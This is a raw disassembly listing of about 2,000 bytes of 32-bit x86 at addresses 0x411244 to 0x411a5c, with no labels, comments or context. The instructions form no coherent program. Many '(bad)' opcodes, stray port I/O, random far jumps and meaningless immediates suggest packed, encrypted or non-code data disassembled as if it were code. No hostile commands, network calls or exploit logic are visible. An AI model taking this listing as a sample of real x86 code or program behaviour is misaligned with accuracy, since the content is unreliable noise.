  411244:	mov    ch,BYTE PTR [esi-0x4a624e66]
  41124a:	pop    ecx
  41124b:	imul   eax,DWORD PTR [edi-0x74],0x6e
  41124f:	jo     0x41128a
  411251:	lahf   
  411252:	leave  
  411253:	(bad)  
  411254:	fisub  WORD PTR [ebp+0x16]
  411257:	test   BYTE PTR [edi+ecx*4],cl
  41125a:	int    0x73
  41125c:	scas   eax,DWORD PTR es:[edi]
  41125d:	cmp    bl,BYTE PTR [ebp+0x21e3a412]
  411263:	mov    edi,0x7f7967cf
  411268:	loope  0x4112b2
  41126a:	rcl    DWORD PTR [eax-0x3cd87fc2],cl
  411270:	xchg   DWORD PTR [esp+eax*2+0x664b2195],edi
  411277:	loopne 0x411230
  411279:	in     al,dx
  41127a:	pop    esp
  41127b:	sbb    BYTE PTR [edx+0x73],ch
  41127e:	(bad)  
  41127f:	xchg   edi,eax
  411280:	sbb    ah,BYTE PTR [esi+0x23ba87ea]
  411286:	mov    eax,0x5f68acd1
  41128b:	jl     0x41120d
  41128d:	dec    esi
  41128e:	mov    ds:0xfc75e855,al
  411293:	pushf  
  411294:	add    ebp,ebx
  411296:	mov    edx,0xa414bed5
  41129b:	fcmovnb st,st(4)
  41129d:	pushf  
  41129e:	lds    ebx,FWORD PTR [ebx-0x34]
  4112a1:	lahf   
  4112a2:	jle    0x41129d
  4112a4:	mov    eax,0x1da7ab15
  4112a9:	cdq    
  4112aa:	mov    bl,0x75
  4112ac:	ret    0xa8db
  4112af:	jg     0x4112a2
  4112b1:	cdq    
  4112b2:	adc    BYTE PTR ds:0xd305a5a3,dh
  4112b8:	xchg   bh,dh
  4112ba:	out    dx,al
  4112bb:	and    al,0x43
  4112bd:	(bad)  
  4112be:	fnstcw WORD PTR [ebx+eiz*8]
  4112c1:	aam    0x19
  4112c3:	cwde   
  4112c4:	jp     0x411279
  4112c6:	sub    DWORD PTR [edx-0x66],esp
  4112c9:	mov    edi,0xbe52bcc4
  4112ce:	sbb    DWORD PTR [edi],eax
  4112d0:	shl    bh,cl
  4112d2:	frstor [ebx+0x33]
  4112d5:	dec    ecx
  4112d6:	gs push esp
  4112d8:	add    BYTE PTR [ecx+0x79b4829c],bh
  4112de:	popa   
  4112df:	sbb    al,al
  4112e1:	stos   DWORD PTR es:[edi],eax
  4112e2:	ss pop ebx
  4112e4:	(bad)  
  4112e6:	pop    esi
  4112e7:	hlt    
  4112e8:	rcr    DWORD PTR [ebx],1
  4112ea:	sub    eax,0xb76fcec3
  4112ef:	and    dh,BYTE PTR [edx+ebp*1+0x12]
  4112f3:	repnz sub ecx,DWORD PTR [eax*2+0x153950a5]
  4112fb:	ins    DWORD PTR es:[edi],dx
  4112fc:	(bad)  
  4112fd:	mov    bh,0x47
  4112ff:	sahf   
  411300:	cmp    eax,ebp
  411302:	and    DWORD PTR [ecx+0x10],ecx
  411305:	add    eax,DWORD PTR ds:0x51cf1f76
  41130b:	out    dx,al
  41130c:	jge    0x411315
  41130e:	scas   eax,DWORD PTR es:[edi]
  41130f:	or     cl,BYTE PTR [ecx]
  411311:	adc    eax,0x94df1f22
  411316:	out    0xd8,al
  411318:	ins    BYTE PTR es:[edi],dx
  411319:	jge    0x4112b6
  41131b:	xchg   ecx,eax
  41131c:	sbb    dh,BYTE PTR ds:0x61ddda16
  411322:	fdiv   QWORD PTR [edx+0x5]
  411325:	int3   
  411326:	xchg   edx,eax
  411327:	mov    edi,edx
  411329:	das    
  41132a:	(bad)  
  41132b:	xor    edi,edx
  41132d:	es jmp 0xcd56:0x16e630c8
  411335:	and    al,0xfe
  411337:	arpl   si,si
  411339:	xlat   BYTE PTR ds:[ebx]
  41133a:	mov    cl,0xd3
  41133c:	mov    ebx,0x2bf2db20
  411341:	mov    ecx,0xbdf3eb5c
  411346:	push   edi
  411347:	dec    BYTE PTR [ecx]
  411349:	retf   
  41134a:	cdq    
  41134b:	pop    esp
  41134c:	cwde   
  41134d:	push   esi
  41134e:	xor    DWORD PTR [esi+0x65],eax
  411351:	outs   dx,DWORD PTR ds:[esi]
  411352:	shl    DWORD PTR [esi-0x7b],1
  411355:	loop   0x411303
  411357:	xor    edx,DWORD PTR [edi-0x10]
  41135a:	push   ds
  41135b:	and    esi,ebp
  41135d:	add    eax,0xa177b16f
  411362:	adc    BYTE PTR [edi],al
  411364:	cli    
  411365:	addr16 push 0x6a22971a
  41136b:	outs   dx,DWORD PTR ds:[esi]
  41136c:	imul   esp,DWORD PTR [ebx],0xffffff8a
  41136f:	add    eax,ebp
  411371:	retf   0xb8c9
  411374:	mov    ebx,ebx
  411376:	(bad)  
  411377:	or     al,0x38
  411379:	shl    BYTE PTR [ebx-0x7d],0xf8
  41137d:	mov    ebx,ebx
  41137f:	fcom   QWORD PTR [edx]
  411381:	inc    edi
  411382:	mov    BYTE PTR [ecx],bh
  411384:	pop    eax
  411385:	mov    al,ds:0xfa31b170
  41138a:	mov    ecx,0xf1d2e07a
  41138f:	mov    ds:0xb6aecba2,eax
  411394:	xor    eax,DWORD PTR [eax+0x5c33ec29]
  41139a:	and    ecx,DWORD PTR [esi]
  41139c:	add    DWORD PTR [edi],esp
  41139e:	inc    esp
  41139f:	xchg   edx,eax
  4113a0:	jg     0x4113c3
  4113a2:	ds repnz icebp 
  4113a5:	shl    DWORD PTR [edi+0x40],1
  4113a8:	jge    0x4113bf
  4113aa:	(bad)  
  4113ab:	mov    edx,0xd9e4869
  4113b0:	jb     0x4113aa
  4113b2:	fs js  0x4113ef
  4113b5:	mov    ch,0xe8
  4113b7:	push   esi
  4113b8:	pop    edi
  4113b9:	popa   
  4113ba:	sub    eax,0xcfae1067
  4113bf:	mov    esp,0xefdd1864
  4113c4:	popf   
  4113c5:	mov    edi,0x5aa24ef
  4113ca:	jo     0x41138a
  4113cc:	pop    DWORD PTR [ebp-0x19]
  4113cf:	sbb    eax,0x7fb63027
  4113d4:	sbb    DWORD PTR [edx+0x1a35a717],esi
  4113da:	lds    edx,FWORD PTR [ecx+0x146e9179]
  4113e0:	mov    ebp,0xd8083808
  4113e5:	iret   
  4113e6:	ja     0x41145c
  4113e8:	push   ebp
  4113e9:	lock push cs
  4113eb:	dec    edx
  4113ec:	repnz call 0xb12a:0xbb1cdf9e
  4113f4:	push   edi
  4113f5:	jg     0x411462
  4113f7:	xchg   esp,esi
  4113f9:	ret    
  4113fa:	push   ebx
  4113fb:	test   al,0xe9
  4113fd:	pop    ecx
  4113fe:	stos   DWORD PTR es:[edi],eax
  4113ff:	fisub  DWORD PTR [edi+edx*4-0x3e16597c]
  411406:	mov    eax,0x9e1af245
  41140b:	aas    
  41140c:	rcr    DWORD PTR [edi],cl
  41140e:	cmc    
  41140f:	out    dx,eax
  411410:	fdivr  QWORD PTR [edi]
  411412:	scas   al,BYTE PTR es:[edi]
  411413:	test   bl,dl
  411415:	cli    
  411416:	cli    
  411417:	fs test eax,0x952b7aba
  41141d:	xrelease xchg BYTE PTR [ecx+0x17],dl
  411421:	jmp    0x86411e54
  411426:	sub    eax,0xd662aeda
  41142b:	push   ecx
  41142c:	lods   eax,DWORD PTR ds:[esi]
  41142d:	aam    0x44
  41142f:	ins    DWORD PTR es:[edi],dx
  411430:	outs   dx,BYTE PTR ds:[esi]
  411431:	mov    bh,0xa4
  411433:	push   eax
  411434:	dec    BYTE PTR [edi+0x33]
  411437:	or     al,0x6a
  411439:	pop    eax
  41143a:	in     eax,dx
  41143b:	and    BYTE PTR [ebx+0x5c94e906],bl
  411441:	aam    0x80
  411443:	or     BYTE PTR [edi+0x21330b1],al
  411449:	hlt    
  41144a:	fiadd  WORD PTR [esi+ebp*2-0x40d6520a]
  411451:	lea    ebp,[ebp-0x4a]
  411454:	jb     0x411442
  411456:	(bad)
  41145a:	ret    0x6dfc
  41145d:	scas   al,BYTE PTR es:[edi]
  41145e:	pop    eax
  41145f:	cld    
  411460:	push   0x8
  411462:	inc    edx
  411463:	sub    al,0xe3
  411465:	and    esp,DWORD PTR [ecx-0x78]
  411468:	jl     0x4113f5
  41146a:	(bad)  
  41146b:	dec    esi
  41146c:	sub    bh,bh
  41146e:	in     al,0xa
  411470:	cwde   
  411471:	mov    ebp,0xcc065bc9
  411476:	jmp    0x411445
  411478:	inc    edi
  411479:	ins    BYTE PTR es:[edi],dx
  41147a:	mov    esi,0x1070cc7c
  41147f:	push   ds
  411480:	imul   edi,DWORD PTR [edi],0xeaa8313c
  411486:	add    DWORD PTR [edx+0x33b3c548],0x90dc1102
  411490:	push   0xc1e9cb7c
  411495:	add    ebx,DWORD PTR [edx+0x78]
  411498:	sub    cl,ch
  41149a:	xchg   ebx,eax
  41149b:	dec    DWORD PTR [edx+0x656d476]
  4114a1:	mov    eax,ds:0x33bda8ea
  4114a6:	aam    0xe5
  4114a8:	or     al,0x30
  4114aa:	std    
  4114ab:	xchg   ebx,eax
  4114ac:	xchg   esp,eax
  4114ad:	frstor [esi-0x3fa69258]
  4114b3:	sub    eax,0xe79efc0c
  4114b8:	mov    ebx,0x8ba549d6
  4114bd:	inc    ebp
  4114be:	pop    ebx
  4114bf:	cmp    edx,DWORD PTR [edx-0x60090e0a]
  4114c5:	nop
  4114c6:	sbb    BYTE PTR [eax+0x3d],ch
  4114c9:	call   0xa7dc74a3
  4114ce:	xchg   esi,eax
  4114cf:	bound  ebp,QWORD PTR [ecx-0x69]
  4114d2:	mov    esi,0xac39fe2a
  4114d7:	sbb    DWORD PTR [ebx-0x3c2f323e],eax
  4114dd:	push   edx
  4114de:	or     bh,dl
  4114e0:	jae    0x4114bf
  4114e2:	cmp    ch,BYTE PTR [esi-0x59a61063]
  4114e8:	jnp    0x4114ae
  4114ea:	in     eax,dx
  4114eb:	(bad)  
  4114ec:	aam    0xba
  4114ee:	test   BYTE PTR [esi],bh
  4114f0:	jp     0x411479
  4114f2:	sbb    ah,BYTE PTR [ecx+0x101aaf1f]
  4114f8:	or     ax,0xf938
  4114fc:	popf   
  4114fd:	jb     0x4114e9
  4114ff:	inc    DWORD PTR [eax+edi*4]
  411502:	loope  0x411517
  411504:	cld    
  411505:	stos   DWORD PTR es:[edi],eax
  411506:	into   
  411507:	xchg   ebx,eax
  411508:	std    
  411509:	xchg   BYTE PTR [ebx-0x4af76ef6],dh
  41150f:	sahf   
  411510:	imul   edi,DWORD PTR [ebx+0x28],0x61d3855e
  411517:	bound  edi,QWORD PTR [eax]
  411519:	lahf   
  41151a:	ins    BYTE PTR es:[edi],dx
  41151b:	add    eax,0x58f64eaa
  411520:	fcmovnbe st,st(1)
  411522:	loopne 0x411563
  411524:	mov    ecx,0xfc3962d2
  411529:	ja     0x411571
  41152b:	jg     0x411522
  41152d:	push   esi
  41152e:	enter  0xef9e,0xba
  411532:	xor    eax,0x89274e28
  411537:	mov    ebp,0x1136e391
  41153c:	push   ebp
  41153d:	clc    
  41153e:	fadd   QWORD PTR [ebx]
  411540:	pop    eax
  411542:	jmp    0xa4ccae2c
  411547:	stos   DWORD PTR es:[edi],eax
  411548:	in     eax,dx
  411549:	scas   eax,DWORD PTR es:[edi]
  41154a:	jge    0x4115b1
  41154c:	retf   0x3c23
  41154f:	jl     0x41154c
  411551:	cld    
  411552:	scas   eax,DWORD PTR es:[edi]
  411553:	jecxz  0x411507
  411555:	dec    edx
  411556:	(bad)  
  411557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411558:	test   DWORD PTR ds:[esi-0xf39def4],edi
  41155f:	sub    al,0x6d
  411561:	js     0x411523
  411563:	bound  edi,QWORD PTR [ebp-0x6a]
  411566:	dec    eax
  411567:	and    ebp,edx
  411569:	add    al,0x85
  41156b:	int    0xbb
  41156d:	inc    edx
  41156e:	pop    ds
  41156f:	mov    ds:0xcee8d728,eax
  411574:	mov    bl,0x35
  411576:	xor    BYTE PTR [eax+0x70c01980],dh
  41157c:	pop    eax
  41157d:	pop    ecx
  41157e:	mov    edi,0x6cc65752
  411583:	or     al,0xba
  411585:	and    ebp,edi
  411587:	add    esi,esi
  411589:	adc    BYTE PTR [edi-0x2c],bl
  41158c:	icebp  
  41158d:	frstor [ebx]
  41158f:	sti    
  411590:	mov    ah,0x7e
  411592:	xor    al,0x4b
  411594:	int3   
  411595:	mov    dl,0x67
  411597:	sti    
  411598:	sbb    al,0xf5
  41159a:	add    eax,0x679f4960
  41159f:	jp     0x4115c5
  4115a1:	jg     0x41155b
  4115a3:	rcl    dh,1
  4115a5:	int    0xfe
  4115a7:	sub    al,cl
  4115a9:	mov    ebx,0xc726567a
  4115ae:	or     esi,edx
  4115b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b1:	rep stos DWORD PTR es:[edi],eax
  4115b3:	fs mov ecx,0xdd1fb199
  4115b9:	mov    ecx,0x85548ac3
  4115be:	test   BYTE PTR [ecx+0x3a9340ab],al
  4115c4:	ficom  WORD PTR [ecx-0x7b]
  4115c7:	inc    esp
  4115c8:	jbe    0x4115b9
  4115ca:	mov    ebp,0xf6cbb05f
  4115cf:	pop    esi
  4115d0:	(bad)  
  4115d1:	fdiv   QWORD PTR [edx-0x41afd534]
  4115d7:	imul   ecx,edi,0x679268f5
  4115dd:	scas   al,BYTE PTR es:[edi]
  4115de:	retf   
  4115df:	adc    cl,ch
  4115e1:	lods   al,BYTE PTR ds:[esi]
  4115e2:	test   al,0x3c
  4115e4:	je     0x4115ff
  4115e6:	sbb    DWORD PTR [ebp-0x1c],0xffffffb9
  4115ea:	push   edi
  4115eb:	ret    
  4115ec:	inc    edx
  4115ed:	dec    esi
  4115ee:	popf   
  4115ef:	pop    es
  4115f0:	arpl   WORD PTR [edx],dx
  4115f2:	js     0x411593
  4115f4:	xor    DWORD PTR [ecx-0x208f724b],edi
  4115fa:	jp     0x41160c
  4115fc:	sbb    DWORD PTR [ecx+0x26],ebx
  4115ff:	arpl   WORD PTR [eax-0x1013f2f3],di
  411605:	jg     0x411610
  411607:	xor    al,0x2a
  411609:	adc    DWORD PTR [ebp+0x6a96ee4],edx
  41160f:	daa    
  411610:	mov    bh,0xd
  411612:	cmp    al,0x97
  411614:	add    esi,DWORD PTR [eax+0x404c13b8]
  41161a:	inc    ebp
  41161b:	out    0xcf,eax
  41161d:	dec    esi
  41161e:	arpl   WORD PTR [edi+0x45408ab5],bp
  411624:	arpl   WORD PTR [esi-0x59e076ba],bp
  41162a:	dec    ebp
  41162b:	in     al,dx
  41162c:	mov    bh,0xfb
  41162e:	xor    BYTE PTR [ecx],ch
  411630:	xchg   esp,eax
  411631:	push   0xffffff84
  411633:	stos   BYTE PTR es:[edi],al
  411634:	xor    eax,0x42656ee2
  411639:	pusha  
  41163a:	rcr    ch,cl
  41163c:	fsub   DWORD PTR [esi]
  41163e:	add    eax,0x52c71b92
  411643:	sbb    cl,BYTE PTR fs:[ecx-0x12]
  411647:	les    edi,FWORD PTR [edi]
  411649:	lock add edi,DWORD PTR [ebx-0x12520553]
  411650:	pop    ds
  411651:	add    ebx,ebx
  411653:	pop    ecx
  411654:	in     al,0x48
  411656:	neg    bl
  411658:	xor    edi,esi
  41165a:	push   esp
  41165b:	inc    esp
  41165c:	shl    BYTE PTR [ecx],cl
  41165e:	cmp    eax,0x1ded9972
  411663:	sbb    cl,BYTE PTR [esi]
  411665:	jg     0x411639
  411667:	popf   
  411668:	fcomp  QWORD PTR [edx-0x10bac2f]
  41166e:	xchg   ebx,eax
  41166f:	data16 (bad) [ebx]
  411672:	add    eax,0xad47171b
  411677:	jmp    0xd17cca80
  41167c:	out    0x2e,al
  41167e:	(bad)  
  41167f:	pushf  
  411680:	cmp    bh,BYTE PTR [eax-0x18358b6]
  411686:	test   eax,0xfac4d923
  41168b:	push   eax
  41168c:	arpl   WORD PTR [eax-0x3f],ax
  41168f:	jns    0x411641
  411691:	test   eax,0xc7d3be1a
  411696:	enter  0xb42d,0x7b
  41169a:	daa    
  41169b:	push   ds
  41169c:	mov    ch,0xb
  41169e:	sbb    BYTE PTR [eax+ebx*4+0x5ed8625d],0x9c
  4116a6:	xlat   BYTE PTR ds:[ebx]
  4116a7:	std    
  4116a8:	cmp    dh,ch
  4116aa:	mov    al,ds:0xb97c9150
  4116af:	(bad)  
  4116b0:	imul   ecx,ebp,0xffffffa9
  4116b3:	popa   
  4116b4:	xchg   ecx,eax
  4116b5:	outs   dx,BYTE PTR ds:[esi]
  4116b6:	shr    BYTE PTR [esi],0xc1
  4116b9:	js     0x411699
  4116bb:	or     al,BYTE PTR [ecx]
  4116bd:	jbe    0x411734
  4116bf:	inc    ebp
  4116c0:	inc    ecx
  4116c1:	mov    eax,0xf6f00b9e
  4116c6:	adc    BYTE PTR [edx],0xf3
  4116c9:	out    0x82,al
  4116cb:	jecxz  0x4116e6
  4116cd:	test   eax,0x8c7bb725
  4116d2:	push   ebp
  4116d3:	adc    eax,0x891e0cfe
  4116d8:	jecxz  0x4116d7
  4116da:	pop    ebx
  4116db:	not    DWORD PTR [edx+0x4c]
  4116de:	jns    0x411754
  4116e0:	aam    0xb1
  4116e2:	mov    al,ds:0xd52116f7
  4116e7:	stc    
  4116e8:	fadd   QWORD PTR [esi]
  4116ea:	int    0x27
  4116ec:	adc    DWORD PTR [ebp+0x6d27d71a],edx
  4116f2:	cdq    
  4116f3:	sbb    BYTE PTR [ebx],ch
  4116f5:	push   ecx
  4116f6:	out    0x64,al
  4116f8:	and    edi,ebp
  4116fa:	sbb    edi,DWORD PTR [eax+0x64]
  4116fd:	inc    eax
  4116fe:	pop    esp
  4116ff:	(bad)  
  411700:	jge    0x411749
  411702:	sbb    dl,BYTE PTR fs:[ebx+ecx*4-0x57132dcd]
  41170a:	mov    esi,0xa243eed6
  41170f:	mov    ebp,0x78b2f585
  411714:	stc    
  411715:	or     al,0xf9
  411717:	dec    ebx
  411718:	jmp    0x411722
  41171a:	jo     0x4116f9
  41171c:	mov    esp,ebx
  41171e:	jb     0x411720
  411720:	mov    BYTE PTR [ebx+0x4dcd5651],dl
  411726:	and    edx,DWORD PTR [ecx+edx*2-0x4eac6d60]
  41172d:	or     edx,DWORD PTR [edi+0x5b]
  411730:	clc    
  411731:	sub    cl,BYTE PTR [ecx-0x61]
  411734:	retf   
  411735:	loopne 0x411712
  411737:	cmp    ecx,ecx
  411739:	repz mov ebp,DWORD PTR [edi+0x52356164]
  411740:	lods   al,BYTE PTR ds:[esi]
  411741:	pusha  
  411742:	les    ebp,FWORD PTR [ebx]
  411744:	adc    al,0x6
  411746:	(bad)  
  411748:	std    
  411749:	cmp    DWORD PTR [eax],edi
  41174b:	gs cmc 
  41174d:	lds    esi,FWORD PTR [ecx]
  41174f:	mov    DWORD PTR [ecx+0x1ce95f2b],ebx
  411755:	ss add eax,0x5b30434c
  41175b:	lock adc ebp,esi
  41175e:	push   ebx
  41175f:	xchg   ecx,eax
  411760:	scas   al,BYTE PTR es:[edi]
  411761:	add    al,bh
  411763:	lods   eax,DWORD PTR ds:[esi]
  411764:	aam    0x47
  411766:	xor    DWORD PTR [edi+0x359c2ca],ebp
  41176c:	sub    al,0xd9
  41176e:	ins    BYTE PTR es:[edi],dx
  41176f:	arpl   WORD PTR [edi+0x1d2583d0],cx
  411775:	aad    0xde
  411777:	or     al,0xec
  411779:	repz inc esp
  41177b:	adc    BYTE PTR [edx+0x1e],al
  41177e:	lahf   
  41177f:	sub    BYTE PTR [edi],ch
  411781:	push   esp
  411782:	dec    esi
  411783:	imul   ebx,esi,0x3a
  411786:	push   0x17a0457d
  41178b:	dec    eax
  41178c:	mov    ah,0x91
  41178e:	mov    al,ds:0x3c0c5f85
  411793:	pop    ebx
  411794:	push   ss
  411795:	fld1   
  411797:	push   0xb1bc31e4
  41179c:	shl    DWORD PTR [edx-0x5307d3a],1
  4117a2:	add    al,0xa7
  4117a4:	sub    eax,0x72c86ebc
  4117a9:	adc    cl,al
  4117ab:	mov    esi,eax
  4117ad:	jae    0x4117aa
  4117af:	mov    esi,esp
  4117b1:	mov    bl,0x51
  4117b3:	or     BYTE PTR ds:0x9b1eac26,al
  4117b9:	jmp    0xec24:0x7f19a724
  4117c0:	lahf   
  4117c1:	pop    ss
  4117c2:	int    0xfc
  4117c4:	and    dh,BYTE PTR [ebx+0x1ec05ea0]
  4117ca:	or     ebp,esi
  4117cc:	nop
  4117cd:	jbe    0x41175e
  4117cf:	jnp    0x411806
  4117d1:	fwait
  4117d2:	data16 out 0x3a,al
  4117d5:	(bad)  
  4117d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d7:	add    ah,BYTE PTR gs:[eax-0x22e94821]
  4117de:	pop    esp
  4117df:	sub    edi,DWORD PTR [ebp+eiz*1+0x44423740]
  4117e6:	cmp    DWORD PTR [esi+edi*8+0x21780e41],ebx
  4117ed:	int3   
  4117ee:	call   0x2d31:0xf1f09df6
  4117f5:	adc    cl,al
  4117f7:	ja     0x41183e
  4117f9:	jge    0x4117a7
  4117fb:	fnstenv [ebp-0x36fcdd55]
  411801:	jo     0x41185f
  411803:	sbb    bh,dh
  411805:	dec    ecx
  411806:	(bad)  
  411807:	jne    0x4117e2
  411809:	dec    eax
  41180a:	in     al,0x9
  41180c:	aaa    
  41180d:	dec    edx
  41180e:	das    
  41180f:	dec    ebp
  411810:	add    BYTE PTR [ebx],0x94
  411813:	and    ecx,DWORD PTR [eax-0x4d9789ae]
  411819:	pusha  
  41181a:	pop    ecx
  41181b:	mov    edi,0x3bdc8759
  411820:	sbb    eax,0x188e360d
  411825:	out    0xd2,al
  411827:	(bad)  
  411828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411829:	or     eax,0x694b3aa9
  41182e:	sub    eax,0x42a931e3
  411833:	test   BYTE PTR [eax+0x14875744],dh
  411839:	leave  
  41183a:	iret   
  41183b:	mov    DWORD PTR [esi+edx*4-0x3b024fe6],0xb339175e
  411846:	cmp    DWORD PTR [edi+ebx*2-0x20],esp
  41184a:	pop    ss
  41184b:	inc    ebp
  41184c:	jo     0x4118b0
  41184e:	rcr    edx,cl
  411850:	das    
  411851:	(bad)  
  411852:	out    dx,eax
  411853:	lahf   
  411854:	pop    eax
  411855:	aam    0x88
  411857:	xlat   BYTE PTR ds:[ebx]
  411858:	pop    ebx
  411859:	jo     0x41185c
  41185b:	hlt    
  41185c:	imul   edi,DWORD PTR [ebx-0x1878e8c3],0xffffffa0
  411863:	adc    al,0x5c
  411865:	or     eax,0x838aaa57
  41186a:	cmp    al,0xce
  41186c:	inc    ecx
  41186d:	jne    0x4118e8
  41186f:	or     DWORD PTR [ebx-0x71],esp
  411872:	add    bh,BYTE PTR [ebx+0x5b]
  411875:	push   cs
  411876:	out    0xd8,eax
  411878:	pop    ss
  411879:	ja     0x4118c4
  41187b:	cmp    eax,0x5a71f915
  411880:	(bad)  
  411881:	idiv   esi
  411883:	adc    eax,0x1a67b03d
  411888:	retf   
  411889:	out    dx,eax
  41188a:	jle    0x4118ef
  41188c:	xor    DWORD PTR [ebx],ebp
  41188e:	xchg   ecx,eax
  41188f:	repnz scas al,BYTE PTR es:[edi]
  411891:	(bad)  
  411892:	icebp  
  411893:	mov    ?,WORD PTR [ebx]
  411895:	(bad)  
  411896:	dec    ebp
  411897:	or     dl,0x59
  41189a:	add    al,0x47
  41189c:	test   eax,0x73005f84
  4118a1:	sbb    eax,0x86be4cb9
  4118a6:	lods   eax,DWORD PTR ds:[esi]
  4118a7:	mov    esp,0x751a3c40
  4118ac:	dec    esi
  4118ad:	push   eax
  4118ae:	pop    ebx
  4118af:	sbb    al,0xc3
  4118b1:	mov    ah,0xdb
  4118b3:	xor    eax,esi
  4118b5:	jecxz  0x4118d4
  4118b7:	lods   al,BYTE PTR ds:[esi]
  4118b8:	mov    al,ds:0x9ce31784
  4118bd:	cwde   
  4118be:	jmp    0x50571a78
  4118c3:	sbb    BYTE PTR [edi],bl
  4118c5:	repz popa 
  4118c7:	sbb    edx,DWORD PTR [ecx]
  4118c9:	rcl    BYTE PTR [ebp+0x35ea430c],0xd7
  4118d0:	ins    DWORD PTR es:[edi],dx
  4118d1:	sbb    DWORD PTR [eax],ebx
  4118d3:	in     eax,0x92
  4118d5:	sbb    ebp,ebp
  4118d7:	lods   eax,DWORD PTR ds:[esi]
  4118d8:	add    DWORD PTR [ebp+0x14],edx
  4118db:	out    dx,eax
  4118dc:	leave  
  4118dd:	test   al,0xd3
  4118df:	sub    bh,BYTE PTR [ecx-0x63]
  4118e2:	fstp   DWORD PTR [esi+0x2b]
  4118e5:	jbe    0x411911
  4118e7:	xchg   esp,eax
  4118e8:	jo     0x411922
  4118ea:	es lahf 
  4118ec:	pop    ebx
  4118ed:	adc    al,0xc2
  4118ef:	dec    ebx
  4118f0:	ret    0xa5ea
  4118f3:	test   eax,0x6e2470b9
  4118f8:	dec    ebp
  4118f9:	lods   eax,DWORD PTR ds:[esi]
  4118fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118fb:	sub    ebx,DWORD PTR gs:[ebx+eiz*8-0x41]
  411900:	nop
  411901:	sub    al,0x77
  411903:	jo     0x4118c1
  411905:	daa    
  411906:	(bad)  
  411907:	psrld  mm0,QWORD PTR [edx-0x5c]
  41190b:	sbb    al,0xee
  41190d:	or     eax,0xc32eca3e
  411912:	push   ecx
  411913:	push   eax
  411914:	repz sub al,0x4a
  411917:	jae    0x4118c3
  411919:	jg     0x411952
  41191b:	out    dx,al
  41191c:	repz jns 0x411945
  41191f:	(bad)
  411922:	push   edx
  411923:	das    
  411924:	and    BYTE PTR [esi+0x7e],bl
  411927:	dec    ecx
  411928:	cmp    bh,BYTE PTR [edi]
  41192a:	inc    eax
  41192b:	sbb    al,0xcd
  41192e:	fmulp  st(0),st
  411930:	mov    bl,0xac
  411932:	cmp    esi,0x22
  411935:	push   0xadb21ecb
  41193a:	jnp    0x4119b2
  41193c:	jae    0x41190d
  41193e:	sub    al,0xbc
  411940:	xor    DWORD PTR fs:[ecx+0x45920f4d],ecx
  411947:	sub    al,BYTE PTR [esi-0x2446d626]
  41194d:	mov    ds:0x1d0bf40f,eax
  411952:	xor    al,0xc3
  411954:	js     0x4118e0
  411956:	lahf   
  411957:	push   ss
  411958:	call   0xd8bb38e9
  41195d:	(bad)  
  41195f:	mov    dh,0xcb
  411961:	ret    
  411962:	inc    edx
  411963:	cwde   
  411964:	imul   edx,DWORD PTR [edx+0x4b7d8808],0x4f
  41196b:	pusha  
  41196c:	fidivr DWORD PTR [edi-0x25b0f0ac]
  411972:	jl     0x41193c
  411974:	jg     0x411980
  411976:	lahf   
  411977:	popa   
  411978:	repz xor esi,edi
  41197b:	cmc    
  41197c:	mov    esp,0x7473bf94
  411981:	in     eax,0xcd
  411983:	inc    esi
  411984:	push   edi
  411985:	mov    BYTE PTR [edi+0x102a5a0d],dl
  41198b:	inc    esi
  41198c:	mov    cl,0xdb
  41198e:	sub    eax,0x4a9a37b2
  411993:	imul   ebp,DWORD PTR [edx-0x24],0xad8ce04d
  41199a:	add    BYTE PTR [eax],bh
  41199c:	(bad)  
  41199d:	mov    ds:0x18093bff,al
  4119a2:	add    dh,BYTE PTR [ebp+0xfb81b7b]
  4119a8:	inc    edx
  4119a9:	sbb    eax,DWORD PTR [ebx-0x73]
  4119ac:	add    al,0x7
  4119ae:	mov    DWORD PTR [esi+edi*8-0x70],esi
  4119b2:	(bad)  
  4119b3:	sbb    ecx,DWORD PTR [ebx+0x35343eb2]
  4119b9:	repz shl DWORD PTR [ebx+0x2db30f11],1
  4119c0:	jb     0x411987
  4119c2:	(bad)  
  4119c4:	out    0x63,al
  4119c6:	fadd   DWORD PTR [ebx-0x77]
  4119c9:	xor    dh,BYTE PTR [edx]
  4119cb:	jb     0x4119a1
  4119cd:	test   al,0x6
  4119cf:	dec    eax
  4119d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d1:	loopne 0x4119e4
  4119d3:	or     edi,esi
  4119d5:	jge    0x411a31
  4119d7:	sub    eax,0x4d4ecbd3
  4119dc:	arpl   cx,dx
  4119de:	fnstsw WORD PTR [edi+edx*8+0xe778679]
  4119e5:	xchg   DWORD PTR [esi],edi
  4119e7:	add    DWORD PTR [edi+0x7749d073],edx
  4119ed:	outs   dx,BYTE PTR ds:[esi]
  4119ee:	or     ch,BYTE PTR [edi-0x30]
  4119f1:	ret    
  4119f2:	dec    ebx
  4119f3:	cmp    BYTE PTR [edx+eiz*1+0x712d60da],0xdc
  4119fb:	cmp    al,0x73
  4119fd:	cmc    
  4119fe:	mov    ds:0x8f28547c,al
  411a03:	aas    
  411a04:	jp     0x41199b
  411a06:	add    bl,BYTE PTR [ebp+0x606453c]
  411a0c:	(bad)  
  411a0d:	jo     0x4119a7
  411a0f:	aad    0x99
  411a11:	sti    
  411a12:	je     0x4119b4
  411a14:	inc    edx
  411a15:	sub    al,BYTE PTR [edi+eax*1]
  411a18:	dec    esi
  411a19:	jle    0x411a3f
  411a1b:	jmp    0x411a9a
  411a1d:	mov    edi,0x367da0c2
  411a22:	test   BYTE PTR [ebp-0x49],0x61
  411a26:	jecxz  0x411a9d
  411a28:	and    dh,ch
  411a2a:	jmp    0xfa2427f7
  411a2f:	xchg   esi,eax
  411a30:	mov    al,0x4b
  411a32:	fist   WORD PTR gs:[ebp-0x32]
  411a36:	sub    ebx,DWORD PTR [esi+0x2cc394fe]
  411a3c:	mov    esp,0xb34dd3ad
  411a41:	sub    DWORD PTR [ebp-0x6f],edx
  411a44:	rol    DWORD PTR [ecx+0x3f],1
  411a47:	mov    bh,0x98
  411a49:	mov    DWORD PTR [ebx+0x16],eax
  411a4c:	jae    0x411a42
  411a4e:	and    BYTE PTR [esi],cl
  411a50:	call   0x8c52:0x6ed9ed0c
  411a57:	mov    esi,0xeb71aae0
  411a5c:	neg    BYTE PTR [edi]
